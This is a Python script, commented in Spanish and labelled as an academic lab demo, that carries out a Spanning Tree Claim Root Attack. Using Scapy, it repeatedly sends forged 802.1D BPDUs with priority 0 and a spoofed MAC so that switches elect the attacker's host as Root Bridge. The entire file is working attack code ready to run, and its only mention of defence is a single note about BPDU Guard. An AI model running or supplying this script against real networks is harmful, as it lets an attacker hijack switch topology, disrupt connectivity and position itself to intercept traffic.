#!/usr/bin/env python3
"""
stp_root_attack.py
------------------
Demostracion academica de un STP Claim Root Attack (Spanning Tree Root Hijack).
USO EXCLUSIVO EN LABORATORIO PROPIO.

Objetivo del script:
    Inyectar BPDUs de configuracion con prioridad de bridge igual a 0 (minima
    posible) para forzar al proceso Spanning Tree a elegir al equipo atacante
    como nuevo Root Bridge, alterando la topologia logica de la red.

Parametros usados:
    IFACE     : Interfaz de red del atacante (conectada a un puerto switch).
    SRC_MAC   : MAC de origen / identificador del falso Root Bridge.
    PRIORITY  : Prioridad del bridge (0 = maxima probabilidad de ganar).
    INTERVAL  : Intervalo de envio de BPDUs (hello time, normalmente 2s).

Requisitos:
    - Linux con privilegios de root (sudo).
    - Python 3.8+
    - Scapy:  pip install scapy
    - El puerto del switch NO debe tener BPDU Guard activo (si lo tiene, el
      puerto pasara a err-disabled: eso ES la contramedida y debe documentarse).

Ejecucion:
    sudo python3 stp_root_attack.py
    Ctrl+C para detener; la red reconverge al Root Bridge original.
"""

import time
from scapy.all import sendp, Ether, LLC, STP

# ------------------- CONFIGURACION (ajustar al laboratorio) -------------------
IFACE    = "eth0"
SRC_MAC  = "00:11:22:33:44:55"   # Identidad del falso Root Bridge
PRIORITY = 0                     # Prioridad minima -> gana la eleccion
INTERVAL = 2                     # Hello time en segundos
# ------------------------------------------------------------------------------


def build_bpdu():
    """
    Construye una BPDU de configuracion 802.1D.
    - Destino 01:80:c2:00:00:00 = direccion multicast reservada para STP.
    - LLC con DSAP/SSAP 0x42 = identificador del protocolo Spanning Tree.
    - rootid/bridgeid = 0 para reclamar el rol de Root Bridge.
    """
    return (
        Ether(dst="01:80:c2:00:00:00", src=SRC_MAC) /
        LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
        STP(
            rootid=PRIORITY, rootmac=SRC_MAC,
            bridgeid=PRIORITY, bridgemac=SRC_MAC,
            pathcost=0,
        )
    )


def main():
    bpdu = build_bpdu()
    print("[*] STP Claim Root Attack")
    print(f"[*] Inyectando BPDUs con prioridad {PRIORITY} desde {SRC_MAC}")
    print(f"[*] Interfaz: {IFACE}  | Intervalo: {INTERVAL}s")
    print("[*] Ctrl+C para detener (la red reconverge al Root original).")

    sent = 0
    try:
        while True:
            sendp(bpdu, iface=IFACE, verbose=0)
            sent += 1
            print(f"\r[+] BPDUs enviadas: {sent}", end="")
            time.sleep(INTERVAL)
    except KeyboardInterrupt:
        print("\n[*] Ataque detenido. Esperando reconvergencia de STP...")


if __name__ == "__main__":
    main()
